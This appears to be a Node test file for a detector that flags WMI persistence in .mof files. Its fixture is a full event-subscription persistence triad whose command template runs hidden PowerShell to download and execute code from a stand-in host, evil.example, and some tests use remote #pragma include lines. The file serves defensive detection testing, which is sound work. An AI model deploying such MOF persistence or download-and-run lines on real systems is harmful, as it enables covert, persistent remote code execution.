'use strict';
// mof-renderer.test.js — Managed Object Format (.mof) WMI schema analyser.
//
// MOF is the textual schema language for WMI. Compiled by mofcomp.exe
// into the WMI repository. Threat surface: ATT&CK T1546.003 (WMI Event
// Subscription persistence). Canonical malicious triad:
//   __EventFilter + ActiveScriptEventConsumer / CommandLineEventConsumer
//   + __FilterToConsumerBinding
//
// These tests verify:
//   • Format banner emitted (medium)
//   • CommandLineEventConsumer → critical (T1546.003 + arbitrary cmd)
//   • ActiveScriptEventConsumer → high
//   • __FilterToConsumerBinding → high
//   • CommandLineTemplate → IOC.COMMAND_LINE
//   • Query → quoted in detection text
//   • #pragma include(http://…) → high + URL IOC
//   • #pragma include(\\unc\…) → high + UNC_PATH IOC
//   • Detections mirror to externalRefs as IOC.PATTERN

const test = require('node:test');
const assert = require('node:assert/strict');
const { loadModules } = require('../helpers/load-bundle.js');

const ctx = loadModules(
  ['src/constants.js', 'src/renderers/mof-renderer.js'],
  { expose: ['MofRenderer', 'IOC', 'escalateRisk'] },
);
const { MofRenderer, IOC } = ctx;

function bufFor(text) {
  return new TextEncoder().encode(text).buffer;
}

const PERSISTENCE_TRIAD = `
#pragma namespace ("\\\\\\\\.\\\\root\\\\subscription")

instance of __EventFilter as $Filter {
  Name = "BotFilter";
  EventNamespace = "root\\\\cimv2";
  Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 13";
  QueryLanguage = "WQL";
};

instance of CommandLineEventConsumer as $Consumer {
  Name = "BotConsumer";
  CommandLineTemplate = "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.example/x')";
};

instance of __FilterToConsumerBinding {
  Filter = $Filter;
  Consumer = $Consumer;
};
`;

test('mof: format banner emitted', () => {
  const r = new MofRenderer();
  const f = r.analyzeForSecurity(bufFor('#pragma namespace ("root\\\\cimv2")\n'), 'a.mof');
  const banner = f.externalRefs.find(x =>
    x.type === IOC.PATTERN && /Managed Object Format/.test(x.url));
  assert.ok(banner, `expected MOF banner, got: ${JSON.stringify(f.externalRefs)}`);
  assert.equal(banner.severity, 'medium');
});

test('mof: full persistence triad escalates to critical', () => {
  const r = new MofRenderer();
  const f = r.analyzeForSecurity(bufFor(PERSISTENCE_TRIAD), 'evil.mof');
  // CommandLineEventConsumer is present → critical.
  assert.equal(f.risk, 'critical');

  const cle = f.externalRefs.find(x =>
    x.type === IOC.PATTERN && /CommandLineEventConsumer/.test(x.url));
  assert.ok(cle, 'expected CommandLineEventConsumer detection');
  assert.equal(cle.severity, 'critical');

  const ase = f.externalRefs.find(x =>
    x.type === IOC.PATTERN && /ActiveScriptEventConsumer/.test(x.url));
  // PERSISTENCE_TRIAD doesn't include ASE — only CommandLineEventConsumer.
  // So ASE must be absent here.
  assert.equal(ase, undefined, 'ASE absent in this fixture');

  const bind = f.externalRefs.find(x =>
    x.type === IOC.PATTERN && /__FilterToConsumerBinding/.test(x.url));
  assert.ok(bind, 'expected __FilterToConsumerBinding detection');
  assert.equal(bind.severity, 'high');

  const filt = f.externalRefs.find(x =>
    x.type === IOC.PATTERN && /__EventFilter\b/.test(x.url));
  assert.ok(filt, 'expected __EventFilter detection');
});

test('mof: CommandLineTemplate emitted as COMMAND_LINE IOC', () => {
  const r = new MofRenderer();
  const f = r.analyzeForSecurity(bufFor(PERSISTENCE_TRIAD), 'evil.mof');
  const allRefs = [...(f.externalRefs || []), ...(f.interestingStrings || [])];
  const cmd = allRefs.find(x =>
    x.type === IOC.COMMAND_LINE && /powershell\.exe/.test(x.url));
  assert.ok(cmd, `expected COMMAND_LINE IOC, got: ${JSON.stringify(allRefs.map(x => ({type: x.type, url: x.url ? x.url.slice(0,40) : ''})))}`);
  assert.equal(cmd.severity, 'high');
});

test('mof: WQL Query surfaced in detection', () => {
  const r = new MofRenderer();
  const f = r.analyzeForSecurity(bufFor(PERSISTENCE_TRIAD), 'evil.mof');
  const wql = f.externalRefs.find(x =>
    x.type === IOC.PATTERN && /WQL Query/.test(x.url));
  assert.ok(wql, 'expected WQL Query detection');
  assert.match(wql.url, /__InstanceModificationEvent/);
});

test('mof: ActiveScriptEventConsumer fires high', () => {
  const text = `
instance of ActiveScriptEventConsumer as $C {
  Name = "X";
  ScriptingEngine = "VBScript";
  ScriptText = "Set objWMI = GetObject(\\"winmgmts:\\\\\\\\.\\\\root\\\\cimv2\\")";
};
`;
  const r = new MofRenderer();
  const f = r.analyzeForSecurity(bufFor(text), 'a.mof');
  const ase = f.externalRefs.find(x =>
    x.type === IOC.PATTERN && /ActiveScriptEventConsumer/.test(x.url));
  assert.ok(ase, 'expected ASE detection');
  assert.equal(ase.severity, 'high');
});

test('mof: #pragma include http URL fires high + URL IOC', () => {
  const text = '#pragma namespace ("root\\\\cimv2")\n#pragma include("http://evil.example/extra.mof")\n';
  const r = new MofRenderer();
  const f = r.analyzeForSecurity(bufFor(text), 'a.mof');
  const det = f.externalRefs.find(x =>
    x.type === IOC.PATTERN && /remote URL/.test(x.url));
  assert.ok(det, `expected remote-include detection, got: ${JSON.stringify(f.externalRefs)}`);
  assert.equal(det.severity, 'high');

  const allRefs = [...(f.externalRefs || []), ...(f.interestingStrings || [])];
  const url = allRefs.find(x => x.type === IOC.URL && x.url === 'http://evil.example/extra.mof');
  assert.ok(url, 'expected URL IOC for remote include');
});

test('mof: #pragma include UNC fires high + UNC_PATH IOC', () => {
  // JS string `\\\\` = 2 literal backslashes (UNC `\\` prefix); `\\share`
  // = `\share` (literal). The file content here is `\\evil.example\share\extra.mof`.
  const text = '#pragma include("\\\\evil.example\\share\\extra.mof")\n';
  const r = new MofRenderer();
  const f = r.analyzeForSecurity(bufFor(text), 'a.mof');
  const det = f.externalRefs.find(x =>
    x.type === IOC.PATTERN && /UNC path/.test(x.url));
  assert.ok(det, 'expected UNC-include detection');
  const allRefs = [...(f.externalRefs || []), ...(f.interestingStrings || [])];
  assert.ok(allRefs.some(x => x.type === IOC.UNC_PATH));
});

test('mof: benign schema does NOT escalate above medium', () => {
  // Plain hardware-schema MOF — has #pragma namespace and `instance of`
  // but neither EventFilter nor EventConsumer.
  const text = `
#pragma namespace ("\\\\\\\\.\\\\root\\\\cimv2")
[abstract]
class CIM_Sensor : CIM_LogicalDevice
{
  uint16 SensorType;
  string OtherSensorTypeDescription;
};
`;
  const r = new MofRenderer();
  const f = r.analyzeForSecurity(bufFor(text), 'sensor.mof');
  assert.equal(f.risk, 'medium', 'banner-only escalation expected');
  assert.equal(f.externalRefs.filter(x => x.severity === 'high').length, 0);
});

test('mof: _summarize counts class instances and bindings', () => {
  const out = MofRenderer._summarize(PERSISTENCE_TRIAD);
  assert.ok(out.classes.includes('__EventFilter'));
  assert.ok(out.classes.includes('CommandLineEventConsumer'));
  assert.ok(out.classes.includes('__FilterToConsumerBinding'));
  assert.equal(out.bindings, 1);
});

test('mof: detections mirror to externalRefs as IOC.PATTERN', () => {
  const r = new MofRenderer();
  const f = r.analyzeForSecurity(bufFor(PERSISTENCE_TRIAD), 'a.mof');
  const patterns = f.externalRefs.filter(x => x.type === IOC.PATTERN);
  assert.ok(patterns.length >= 3, `expected ≥3 pattern rows, got ${patterns.length}`);
  // Each canonical detection must surface as a Pattern (so Summary/STIX/MISP see it).
  assert.ok(patterns.some(p => /Managed Object Format/.test(p.url)));
  assert.ok(patterns.some(p => /CommandLineEventConsumer/.test(p.url)));
  assert.ok(patterns.some(p => /__FilterToConsumerBinding/.test(p.url)));
});

test('mof: all hits use IOC.* constants (no bare strings)', () => {
  const r = new MofRenderer();
  const f = r.analyzeForSecurity(bufFor(PERSISTENCE_TRIAD), 'a.mof');
  const allowed = ['Pattern', 'URL', 'UNC Path', 'Command Line', 'Crypto Address',
                   'Secret', 'Hostname', 'Domain'];
  for (const e of f.externalRefs) {
    assert.ok(allowed.includes(e.type), `unexpected bare type: ${e.type}`);
  }
});
